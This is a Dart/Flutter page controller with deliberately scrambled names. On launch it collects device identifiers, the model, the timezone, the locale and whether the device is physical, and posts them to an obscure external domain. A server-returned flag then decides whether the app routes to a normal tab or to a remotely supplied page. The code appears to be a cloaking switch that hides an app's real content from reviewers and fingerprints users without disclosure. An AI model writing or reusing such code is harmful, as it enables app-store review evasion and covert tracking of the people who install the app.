import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var tpyxvc = RxBool(false);
  var zvkjmicay = RxBool(true);
  var mfweu = RxString("");
  var felix = RxBool(false);
  var hagenes = RxBool(true);
  final oslhkcanw = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    gyisafk();
  }


  Future<void> gyisafk() async {

    felix.value = true;
    hagenes.value = true;
    zvkjmicay.value = false;

    oslhkcanw.post("https://ass.wroklnte.live/AKYoTTZBco1OqMs",data: await gbiyfnqz()).then((value) {
      var bpzuf = value.data["bpzuf"] as String;
      var wuzfqvk = value.data["wuzfqvk"] as bool;
      if (wuzfqvk) {
        mfweu.value = bpzuf;
        ella();
      } else {
        legros();
      }
    }).catchError((e) {
      zvkjmicay.value = true;
      hagenes.value = true;
      felix.value = false;
    });
  }

  Future<Map<String, dynamic>> gbiyfnqz() async {
    final DeviceInfoPlugin kfpc = DeviceInfoPlugin();
    PackageInfo prtkcun_vzjunaq = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var sbfl = Platform.localeName;
    var edIK = currentTimeZone;

    var nplzxsT = prtkcun_vzjunaq.packageName;
    var lzJTe = prtkcun_vzjunaq.version;
    var GCga = prtkcun_vzjunaq.buildNumber;

    var yPLprJvk = prtkcun_vzjunaq.appName;
    var SPTNjcd = "";
    var NEWFKzT = "";
    var INjOBmVs = "";
    var lelaTerry = "";
    var tyreeHessel = "";


    var fDNnpF  = "";
    var samanthaJacobs = "";
    var tMbJn = false;

    if (GetPlatform.isAndroid) {
      SPTNjcd = "android";
      var wzufiyenb = await kfpc.androidInfo;

      INjOBmVs = wzufiyenb.brand;

      NEWFKzT  = wzufiyenb.model;
      fDNnpF = wzufiyenb.id;

      tMbJn = wzufiyenb.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      SPTNjcd = "ios";
      var dimerzc = await kfpc.iosInfo;
      INjOBmVs = dimerzc.name;
      NEWFKzT = dimerzc.model;

      fDNnpF = dimerzc.identifierForVendor ?? "";
      tMbJn  = dimerzc.isPhysicalDevice;
    }
    var res = {
      "GCga": GCga,
      "samanthaJacobs" : samanthaJacobs,
      "lzJTe": lzJTe,
      "nplzxsT": nplzxsT,
      "lelaTerry" : lelaTerry,
      "NEWFKzT": NEWFKzT,
      "edIK": edIK,
      "fDNnpF": fDNnpF,
      "sbfl": sbfl,
      "SPTNjcd": SPTNjcd,
      "yPLprJvk": yPLprJvk,
      "tMbJn": tMbJn,
      "tyreeHessel" : tyreeHessel,
      "INjOBmVs": INjOBmVs,

    };
    return res;
  }

  Future<void> legros() async {
    Get.offAllNamed("/eventTab");
  }

  Future<void> ella() async {
    Get.offAllNamed("/eventNotic");
  }

}
